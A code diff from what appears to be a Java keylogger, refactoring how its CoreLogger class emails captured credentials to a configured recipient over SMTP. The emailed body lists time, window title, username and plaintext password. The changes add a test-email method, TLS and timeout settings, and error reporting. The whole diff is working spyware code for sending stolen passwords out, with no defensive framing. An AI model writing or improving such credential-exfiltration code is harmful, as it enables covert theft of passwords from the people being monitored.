@@ -412,20 +412,42 @@ public class CoreLogger
     // ── Email ─────────────────────────────────────────────────────────────────
 
     private void sendEmail(final CredentialEntry entry) {
-        final EmailConfig cfg = emailConfig;
+        dispatchEmail(emailConfig, buildEmailBody(entry),
+                "[KeyLogger] " + entry.getType() + " -- "
+                + entry.getWindow().substring(0, Math.min(50, entry.getWindow().length())),
+                null);
+    }
+
+    /** Sends a test email; calls onResult with null on success or an error message on failure. */
+    public void sendTestEmail(final java.util.function.Consumer<String> onResult) {
+        dispatchEmail(emailConfig, "KeyLogger test email — configuration OK.",
+                "[KeyLogger] Test Email", onResult);
+    }
+
+    private void dispatchEmail(final EmailConfig cfg, final String body,
+                               final String subject,
+                               final java.util.function.Consumer<String> onResult) {
         if (!cfg.isEnabled()
                 || cfg.getSender().trim().isEmpty()
                 || cfg.getAppPassword().trim().isEmpty()
-                || cfg.getRecipient().trim().isEmpty()) return;
+                || cfg.getRecipient().trim().isEmpty()) {
+            if (onResult != null) onResult.accept("Email alerts are disabled or not fully configured.");
+            return;
+        }
 
         Thread t = new Thread(new Runnable() {
             @Override public void run() {
                 try {
                     Properties props = new Properties();
-                    props.put("mail.smtp.host",            cfg.getSmtpServer());
-                    props.put("mail.smtp.port",            String.valueOf(cfg.getSmtpPort()));
-                    props.put("mail.smtp.auth",            "true");
-                    props.put("mail.smtp.starttls.enable", "true");
+                    props.put("mail.smtp.host",               cfg.getSmtpServer());
+                    props.put("mail.smtp.port",               String.valueOf(cfg.getSmtpPort()));
+                    props.put("mail.smtp.auth",               "true");
+                    props.put("mail.smtp.starttls.enable",    "true");
+                    props.put("mail.smtp.starttls.required",  "true");
+                    props.put("mail.smtp.ssl.protocols",      "TLSv1.2");
+                    props.put("mail.smtp.connectiontimeout",  "10000");
+                    props.put("mail.smtp.timeout",            "10000");
+                    props.put("mail.smtp.writetimeout",       "10000");
 
                     final String user = cfg.getSender();
                     final String pass = cfg.getAppPassword();
@@ -436,35 +458,38 @@ public class CoreLogger
                         }
                     });
 
-                    String subject = "[KeyLogger] " + entry.getType() + " -- "
-                            + entry.getWindow().substring(0,
-                                Math.min(50, entry.getWindow().length()));
-
-                    StringBuilder body = new StringBuilder();
-                    body.append("KeyLogger Alert\n").append(repeat('=', 40)).append("\n");
-                    body.append("Time     : ").append(entry.getTimestamp()).append("\n");
-                    body.append("Type     : ").append(entry.getType()).append("\n");
-                    body.append("Window   : ").append(entry.getWindow()).append("\n");
-                    if (entry.getUsername() != null
-                            && !entry.getUsername().trim().isEmpty())
-                        body.append("Username : ").append(entry.getUsername()).append("\n");
-                    body.append("Password : ").append(entry.getPassword()).append("\n");
-
                     Message msg = new MimeMessage(session);
                     msg.setFrom(new InternetAddress(cfg.getSender()));
                     msg.setRecipients(Message.RecipientType.TO,
                             InternetAddress.parse(cfg.getRecipient()));
                     msg.setSubject(subject);
-                    msg.setText(body.toString());
+                    msg.setText(body);
                     Transport.send(msg);
 
-                } catch (MessagingException ex) {
-                    writeLog("\n[EMAIL ERROR: " + ex.getMessage() + "]\n");
+                    writeLog("\n[EMAIL SENT: " + subject + "]\n");
+                    if (onResult != null) onResult.accept(null);
+
+                } catch (Exception ex) {
+                    String err = ex.getMessage() != null ? ex.getMessage() : ex.getClass().getName();
+                    writeLog("\n[EMAIL ERROR: " + err + "]\n");
+                    if (onResult != null) onResult.accept(err);
                 }
             }
         });
         t.setDaemon(true);
         t.start();
+    }
+
+    private String buildEmailBody(CredentialEntry entry) {
+        StringBuilder body = new StringBuilder();
+        body.append("KeyLogger Alert\n").append(repeat('=', 40)).append("\n");
+        body.append("Time     : ").append(entry.getTimestamp()).append("\n");
+        body.append("Type     : ").append(entry.getType()).append("\n");
+        body.append("Window   : ").append(entry.getWindow()).append("\n");
+        if (entry.getUsername() != null && !entry.getUsername().trim().isEmpty())
+            body.append("Username : ").append(entry.getUsername()).append("\n");
+        body.append("Password : ").append(entry.getPassword()).append("\n");
+        return body.toString();
     }
 
     // ── Utilities ─────────────────────────────────────────────────────────────
